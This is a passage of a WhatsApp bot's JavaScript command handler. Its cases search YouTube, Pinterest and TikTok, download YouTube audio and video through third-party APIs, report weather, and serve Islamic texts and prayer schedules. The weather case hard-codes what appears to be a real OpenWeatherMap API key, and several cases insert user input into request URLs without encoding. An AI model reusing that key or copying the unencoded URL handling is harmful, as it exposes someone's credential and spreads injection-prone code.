            return books;
        } catch (error) {
            console.error('Error fetching data:', error.message);
            return [];
        }
    }
    // wm avz
    avzzzz(q)
        .then(results => {
            if (results.length === 0) {
                ReplyRynzz('ora eneng.');
            } else {
                let response = `Hasil pencarian Goodreads untuk: ${q}\n\n`;
                results.forEach((item, index) => {
                    response += `${index + 1}. ${item.title}\nRating: ${item.rating}\nLink: ${item.link}\n\n`;
                });
                ReplyRynzz(response);
            }
        })
        .catch(error => {
            ReplyRynzz('emror.');
        });
        }
    break                 

case "yts": {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz('we dont talk')
await Alice.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await ReplyRynzz(teks)
await Alice.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
}
break

case 'putar':
case 'lagu':
case 'music':
case 'ytplay': 
case 'play': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz('lagu apa yg ingin dicari');

    await xreaction()
    try {
        let search = await yts(text);
        let firstVideo = search.all[0];
        let response = await ddownr.download(firstVideo.url, 'mp3')
        let hasil = response.downloadUrl
        await Alice.sendMessage(m.chat, {
            audio: {
                url: hasil
            },
            mimetype: 'audio/mp4',
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: firstVideo.title || 'Untitled',
                    body: `${botname}`,
                    sourceUrl: firstVideo.url,
                    thumbnailUrl: firstVideo.thumbnail || 'https://example.com/default_thumbnail.jpg',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } catch (e) {
      console.log(e)
        await Alice.sendMessage(m.chat, { react: { text: '🚫', key: m.key } });
        try {
            let search = await yts(text);
            let firstVideo = search.all[0];
            let memek = await fetchJson(`${global.beta}/api/download/ytmp3?url=${firstVideo.url}&apikey=${global.botz}`);
            let hasil = memek.result;

            await Alice.sendMessage(m.chat, {
                audio: {
                    url: hasil.mp3
                },
                mimetype: 'audio/mp4',
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        title: firstVideo.title || 'Untitled',
                        body: `${botname}`,
                        sourceUrl: firstVideo.url,
                        thumbnailUrl: firstVideo.thumbnail || 'https://example.com/default_thumbnail.jpg',
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: m });
        } catch (e) {
            console.log(e);
            let search = await yts(text);
            let firstVideo = search.all[0];
            let Xyroo = await fetchJson(`https://api.agatz.xyz/api/ytmp3?url=${firstVideo.url}`);

            await Alice.sendMessage(m.chat, {
                audio: {
                    url: Xyroo.data
                },
                mimetype: 'audio/mp4',
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        title: firstVideo.title || 'Untitled',
                        body: `${botname}`,
                        sourceUrl: firstVideo.url,
                        thumbnailUrl: firstVideo.thumbnail || 'https://example.com/default_thumbnail.jpg',
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: m });
        }
    }
}
break;

case 'ytmp3': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz(`Masukkan Url Yotube\n\nExample: ${XyrooRynzz} Url`)
    
async function ytmp3(url) {
    const format = "mp3"; 
    const response = await axios.get(`https://youtubedownloader.me/api/download?format=${format}&url=${encodeURIComponent(url)}`, {
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
            "Referer": "https://youtubedownloader.me/"
        }
    });
    const videoId = response.data.id;
    let progress = 0;
    let downloadUrl = null;
    let attempt = 0;
    while (progress < 1000 && attempt < 20) {
        const progressResponse = await axios.get(`https://youtubedownloader.me/api/progress?id=${videoId}`, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
                "Referer": "https://youtubedownloader.me/"
            }
        });

        progress = progressResponse.data.progress;
        if (progress >= 1000) {
            downloadUrl = progressResponse.data.download_url;
            break;
        }
        attempt++;
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
    return downloadUrl;
}

    let b = await ytmp3(text)
    
    Alice.sendMessage(m.chat, {
        audio: {
            url: b
        }, 
        mimetype: "audio/mpeg",
        ptt: true 
    }, { quoted: m })
}
break


case 'ytmp4' : {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz(`Masukkan Url Yotube\n\nExample: ${XyrooRynzz} Url`)

async function ytmp4(url) {
    const format = "360"; 
    const response = await axios.get(`https://youtubedownloader.me/api/download?format=${format}&url=${encodeURIComponent(url)}`, {
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
            "Referer": "https://youtubedownloader.me/"
        }
    });
    const videoId = response.data.id;
    let progress = 0;
    let downloadUrl = null;
    let attempt = 0;
    while (progress < 1000 && attempt < 20) {
        const progressResponse = await axios.get(`https://youtubedownloader.me/api/progress?id=${videoId}`, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
                "Referer": "https://youtubedownloader.me/"
            }
        });

        progress = progressResponse.data.progress;
        if (progress >= 1000) {
            downloadUrl = progressResponse.data.download_url;
            break;
        }
        attempt++;
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
    return downloadUrl;
}

    let b = await ytmp4(text)
    
    Alice.sendMessage(m.chat, {
        video: {
            url: b
        } 
    }, { quoted: m })
}
break

case "pin":
  case "pinterest":{
 if (isBan) return Xban()
await xreaction()
      if (!text) return ReplyRynzz(`Example : ${XyrooRynzz} Michie jkt48`);
      let data =  await require('axios').get(`https://api.siputzx.my.id/api/s/pinterest?query=${text}`)
      let a = data.data.data
      let result = a[Math.floor(Math.random() * a.length)];
      Alice.sendButtonImg(m.chat,
        [
            {
                id: `${prefix + command} ${text}`,
                text: 'Next',
                type: 1
            }
        ],"Pin Search Ressults", result.images_url, `© ${botname} `, m, {viewOnce: true })
  }
  break;

case 'tiktoksearch':
case 'ttsearch': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} jj epep`)
await xreaction()
try {
let anu = await ds.search.tiktoks(text)
let cap = `*T I K T O K - S E A R C H*\n\n*Tittle* : ${anu.title}\n*Cover* : ${anu.cover}`
Alice.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: cap }, { quoted: m })
Alice.sendMessage(m.chat, { audio: { url: anu.music }, mimetype: 'audio/mpeg' }, { quoted: m })
} catch (error) {
ReplyRynzz('Error :v')
}
}
break

case 'weather':{
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           Alice.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Search Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
           
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Islami Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'ayat': {
  if (isBan) return Xban()
await xreaction()
 if (!text) {
 return ReplyRynzz(`Masukkan format\nExample: ${XyrooRynzz} <surah> <ayat>`);
 }

 let [surah, ayat] = text.split(" ");
 if (!surah || !ayat || isNaN(surah) || isNaN(ayat)) {
 return ReplyRynzz("Format tidak valid. Pastikan Anda memasukkan angka untuk surah dan ayat.");
 }

async function alquran(surah, ayat) {
    try {
        const url = `https://www.velyn.biz.id/api/search/alquran?surah=${surah}&ayat=${ayat}`;
        const response = await fetch(url);

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const data = await response.json();

        if (!data || !data.text) {
            throw new Error("Data tidak ditemukan atau format tidak valid.");
        }

        return {
            text: data.text,
            translation: data.translation,
            tafsir: data.tafsir,
            surah_nama: data.surah_nama,
            surah: data.surah,
            ayat: data.ayat,
            revelation_place: data.revelation_place,
            surah_total_ayat: data.surah_total_ayat,
            tafsir_lengkap: data.tafsir_lengkap
        };
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
        return null;
    }
}

 try {
        let result = await alquran(surah, ayat);
        if (result) {
            let output = `📖 **Surah ${result.surah_nama} (${surah}), Ayat ${ayat}**\n\n${result.text}\n\n📜 **Terjemahan:** ${result.translation}\n\n📝 **Tafsir Singkat:** ${result.tafsir}\n\n📌 **Informasi Tambahan:**\n- **Nama Surah**: ${result.surah_nama}\n- **Nomor Surah**: ${result.surah}\n- **Nomor Ayat**: ${result.ayat}\n- **Revelasi**: ${result.revelation_place}\n- **Jumlah Ayat dalam Surah**: ${result.surah_total_ayat}\n- **Tafsir Lengkap**: ${result.tafsir_lengkap}`;
            ReplyRynzz(m.chat, output, m);
        } else {
           ReplyRynzz("Ayat tidak ditemukan.")
        }
    } catch (error) {
        ReplyRynzz(m.chat, `Terjadi kesalahan: ${error.message}`, m);
    }
};
break;
case 'caridoa':
case 'doa': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz('Contoh : .doa Bangun Tidur');
await xreaction()
let Xyroo = await fetchJson(`https://api.autoresbot.com/api/doa?q=${text}`)
let cap = Xyroo.data[0];
let doanya = `*_${cap.doa}_\n${cap.ayat}\n${cap.latin}\nArtinya : ${cap.artinya}"`
await ReplyRynzz(doanya)
}
break

case 'tafsir': 
case 'tafsirsurah': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz(`Example : .tafsir adam\n\n💡 *Tips* : Ketik nama surah yang ingin Anda ketahui tafsirnya, misalnya '.tafsir Yusuf'.`)
  await xreaction();
    try {
        let response = await fetchJson(`https://widipe.com/tafsirsurah?text=${text}`);
const results = response.result;
function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}
const anubis = getRandomElement(results);
if (anubis && anubis.surah && anubis.tafsir && anubis.type && anubis.source) {
    let surah = anubis.surah;
    let tafsir = anubis.tafsir;
    let artikel = anubis.type;
    let source = anubis.source;

    let tafsirResult = `🌿 *Tafsir Surah ${surah}*\n\n` +
        `• *Surah* : ${surah}\n` +
        `• *Tafsir* :\n${tafsir}\n\n` +
        `• *Kategori Tafsir* : ${artikel}\n` +
        `• *Sumber* : ${source}\n\n` +
        `Terima kasih telah menggunakan layanan kami! 🌸`;

    return ReplyRynzz(tafsirResult);
} else {
    return ReplyRynzz("*Maaf, data tafsir tidak lengkap atau tidak ditemukan.*");
}
    } catch (error) {
        return ReplyRynzz("*Terjadi Kesalahan!* 🙁\n\nMohon maaf, ada masalah saat mencari tafsir surah. Silakan coba lagi nanti.");
    }
}
                break

case 'jadwalsholat': {
if (isBan) return Xban()
await xreaction()
     if (!text) return ReplyRynzz(`[ Example ] : Jadwalsholat Lokasi Anda`) 
     try {
        let respon = await fetch(`https://api.agatz.xyz/api/jadwalsholat?kota=${text}`);
        let waktu = await respon.json();       
        let subuh = waktu.data.subuh;
        let dhuhur = waktu.data.dhuhur;
        let ashar = waktu.data.ashar;
        let maghrib = waktu.data.maghrib;
        let isya = waktu.data.isya;
        // Menampilkan hasil Ya woy
        Alice.sendMessage(from, {
            image: { url: 'https://files.catbox.moe/nb7wuq.jpg' },
            caption: `*Jadwal Sholat di Kota ${text}*\n\n` +
                     `🕌 Subuh: ${subuh}\n` +
                     `🕌 Dhuhur: ${dhuhur}\n` +
                     `🕌 Ashar: ${ashar}\n` +
                     `🕌 Maghrib: ${maghrib}\n` +
                     `🕌 Isya: ${isya}\n\n` +
                     `Jangan Lupa Sholat Dan Semoga sholat kita diterima Allah SWT.`,
        });
    } catch (error) {
        console.error(error);
        ReplyRynzz('*Terjadi kesalahan saat melakukan pencarian. Silakan coba lagi.*');
   }
 }
                break

case 'artisurah': {
if (isBan) return Xban()
await xreaction()
  if (!q) return ReplyRynzz(`Example ${XyrooRynzz} 113`)
async function surah(no){
	return new Promise(async(resolve, reject) => {
		axios.get('https://kalam.sindonews.com/surah/' + no)
		.then(({ data }) => {
			const $ = cheerio.load(data)
			const result = [];
			const ar = [];
			const id = [];
			const lt = [];
			const au = [];
			$('div.breadcrumb-new > ul > li:nth-child(5)').each(function(c,d) {
			result.audio = $(d).find('a').attr('href').replace('surah','audioframe')
			})
			$('div.ayat-arab').each(function(a, b) {
				ar.push($(b).text()) 
			})
			$('li > div.ayat-text').each(function(e, f) {
				id.push($(f).text().replace(',','').trim()) })
			$('div.ayat-latin').each(function(g, h) {
				lt.push($(h).text().trim())	})
			for(let i = 0; i < ar.length ; i++){
			result.push({
				arab: ar[i],
				indo: id[i],
				latin: lt[i],
			})
		}
			resolve(result)
		})
		.catch(reject)
	})
}
surah(q).then(result => {
 if (result.length === 0) {
 ReplyRynzz('Tidak ada hasil yang ditemukan.');
 return;
 }
 
 let replyTexttt = `Hasil dari Surah untuk "${q}":\n\n`;
 result.forEach((result, index) => {
 replyTexttt += `${result.indo}\n${result.arab}\n${result.latin}\n\n`;
 });
 
 ReplyRynzz(replyTexttt);
 }).catch(error => {
 ReplyRynzz('Terjadi kesalahan saat memasuki angka di surah.');
 console.error(error);
 });
}
break
case 'niatsholat': {
if (isBan) return Xban()
await xreaction()
    if (!q) return ReplyRynzz(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return ReplyRynzz(`${text} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    ReplyRynzz(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
 case 'kisahnabi': {
if (isBan) return Xban()
await xreaction()

     if (!text) return ReplyRynzz(`Masukan nama nabi\nExample: kisahnabi adam`)

     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)

     let kisah = await url.json().catch(_ => "Error")

     if (kisah == "Error") return ReplyRynzz("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")

     

    let hasil = `_*👳 Nabi :*_ ${kisah.name}

_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}

_*📍 Tempat Lahir :*_ ${kisah.tmp}

_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     ReplyRynzz(`${hasil}`)

}

break
        
case 'ayatkursi': {
if (isBan) return Xban()
await xreaction()

  let caption = `

*「 Ayat Kursi 」*

اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ

“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”

Artinya:

Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.

Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 

(QS. Al Baqarah: 255)

`.trim()

  ReplyRynzz(caption)

}

break            
case 'dalamislam': {
if (isBan) return Xban()
await xreaction()
    if (!q.trim()) return ReplyRynzz("_contoh .dalamislam dosa");
// wm avs
    const axios = require('axios');
    const cheerio = require('cheerio');
// wm avs
    async function scrapeHadis(searchTerm) {
        const url = `https://dalamislam.com/?s=${encodeURIComponent(searchTerm)}`;
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const hadisList = [];
// wm avs
            $('.entry-title a').each((index, element) => {
                const title = $(element).text().trim();
                const link = $(element).attr('href');
                hadisList.push({ title, link });
            });
// wm avs
            return hadisList;
        } catch (error) {
            console.error('Error fetching data:', error);
            throw new Error('elul.');
        }
    }
// wm avs
    scrapeHadis(q)
        .then(results => {
            if (results.length === 0) {
                ReplyRynzz('tak ada hasil.');
            } else {
                let response = `Hasil pencarian hadis dari Dalam Islam untuk: ${q}\n\n`;
                results.forEach((item, index) => {
                    response += `${index + 1}. ${item.title}\nLink: ${item.link}\n\n`;
                });
                ReplyRynzz(response);
            }
        })
        .catch(error => {
            console.error(`${error.message}`);
            ReplyRynzz('Terjadi kesalahan.');
        });
}
    break        
case 'kisahnabi': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/Sanz-MDChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return ReplyRynzz("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")

let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

ReplyRynzz(`${hasil}`)

}
break

case 'asmaulhusna': {
if (isBan) return Xban()
await xreaction()
const contoh = `*Asmaul Husna*`
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`
const asmaulhusna = [
{
index: 1,
latin: "Ar Rahman",
arabic: "الرَّحْمَنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemurah",
translation_en: "The All Beneficent"
},
{
index: 2,
latin: "Ar Rahiim",
arabic: "الرَّحِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Penyayang",
translation_en: "The Most Merciful"
},
{
index: 3,
latin: "Al Malik",
arabic: "الْمَلِكُ",
translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
translation_en: "The King, The Sovereign"
},
{
index: 4,
latin: "Al Quddus",
arabic: "الْقُدُّوسُ",
translation_id: "Yang Memiliki Mutlak sifat Suci",
translation_en: "The Most Holy"
},
{
index: 5,
latin: "As Salaam",
arabic: "السَّلاَمُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
translation_en: "Peace and Blessing"
},
{
index: 6,
latin: "Al Mu’min",
arabic: "الْمُؤْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
translation_en: "The Guarantor"
},
{
index: 7,
latin: "Al Muhaimin",
arabic: "الْمُهَيْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
translation_en: "The Guardian, the Preserver"
},
{
index: 8,
latin: "Al ‘Aziiz",
arabic: "الْعَزِيزُ",
translation_id: "Yang Memiliki Mutlak Kegagahan",
translation_en: "The Almighty, the Self Sufficient"
},
{
index: 9,
latin: "Al Jabbar",
arabic: "الْجَبَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Perkasa",
translation_en: "The Powerful, the Irresistible"
},
{
index: 10,
latin: "Al Mutakabbir",
arabic: "الْمُتَكَبِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
translation_en: "The Tremendous"
},
{
index: 11,
latin: "Al Khaliq",
arabic: "الْخَالِقُ",
translation_id: "Yang Memiliki Mutlak sifat Pencipta",
translation_en: "The Creator"
},
{
index: 12,
latin: "Al Baari’",
arabic: "الْبَارِئُ",
translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
translation_en: "The Maker"
},
{
index: 13,
latin: "Al Mushawwir",
arabic: "الْمُصَوِّرُ",
translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
translation_en: "The Fashioner of Forms"
},
{
index: 14,
latin: "Al Ghaffaar",
arabic: "الْغَفَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Pengampun",
translation_en: "The Ever Forgiving"
},
{
index: 15,
latin: "Al Qahhaar",
arabic: "الْقَهَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Memaksa",
translation_en: "The All Compelling Subduer"
},
{
index: 16,
latin: "Al Wahhaab",
arabic: "الْوَهَّابُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
translation_en: "The Bestower"
},
{
index: 17,
latin: "Ar Razzaaq",
arabic: "الرَّزَّاقُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
translation_en: "The Ever Providing"
},
{
        index: 18,
        latin: "Al Fattaah",
        arabic: "الْفَتَّاحُ",
        translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
        translation_en: "The Opener, the Victory Giver"
    },
    {
        index: 19,
        latin: "Al ‘Aliim",
        arabic: "اَلْعَلِيْمُ",
        translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
        translation_en: "The All Knowing, the Omniscient"
    },
    {
        index: 20,
        latin: "Al Qaabidh",
        arabic: "الْقَابِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
        translation_en: "The Restrainer, the Straightener"
    },
    {
        index: 21,
        latin: "Al Baasith",
        arabic: "الْبَاسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
        translation_en: "The Expander, the Munificent"
    },
    {
        index: 22,
        latin: "Al Khaafidh",
        arabic: "الْخَافِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
        translation_en: "The Abaser"
    },
    {
        index: 23,
        latin: "Ar Raafi’",
        arabic: "الرَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
        translation_en: "The Exalter"
    },
    {
        index: 24,
        latin: "Al Mu’izz",
        arabic: "الْمُعِزُّ",
        translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
        translation_en: "The Giver of Honor"
    },
    {
        index: 25,
        latin: "Al Mudzil",
        arabic: "المُذِلُّ",
        translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
        translation_en: "The Giver of Dishonor"
    },
    {
        index: 26,
        latin: "Al Samii’",
        arabic: "السَّمِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
        translation_en: "The All Hearing"
    },
    {
        index: 27,
        latin: "Al Bashiir",
        arabic: "الْبَصِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
        translation_en: "The All Seeing"
    },
    {
        index: 28,
        latin: "Al Hakam",
        arabic: "الْحَكَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
        translation_en: "The Judge, the Arbitrator"
    },
    {
        index: 29,
        latin: "Al ‘Adl",
        arabic: "الْعَدْلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Utterly Just"
    },
    {
        index: 30,
        latin: "Al Lathiif",
        arabic: "اللَّطِيفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
        translation_en: "The Subtly Kind"
    },
    {
        index: 31,
        latin: "Al Khabiir",
        arabic: "الْخَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
        translation_en: "The All Aware"
    },
    {
        index: 32,
        latin: "Al Haliim",
        arabic: "الْحَلِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
        translation_en: "The Forbearing, the Indulgent"
    },
    {
        index: 33,
        latin: "Al ‘Azhiim",
        arabic: "الْعَظِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
        translation_en: "The Magnificent, the Infinite"
    },
    {
        index: 34,
        latin: "Al Ghafuur",
        arabic: "الْغَفُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
        translation_en: "The All Forgiving"
    },
    {
        index: 35,
        latin: "As Syakuur",
        arabic: "الشَّكُورُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
        translation_en: "The Grateful"
    },
    {
        index: 36,
        latin: "Al ‘Aliy",
        arabic: "الْعَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Sublimely Exalted"
    },
    {
        index: 37,
        latin: "Al Kabiir",
        arabic: "الْكَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
        translation_en: "The Great"
    },
    {
        index: 38,
        latin: "Al Hafizh",
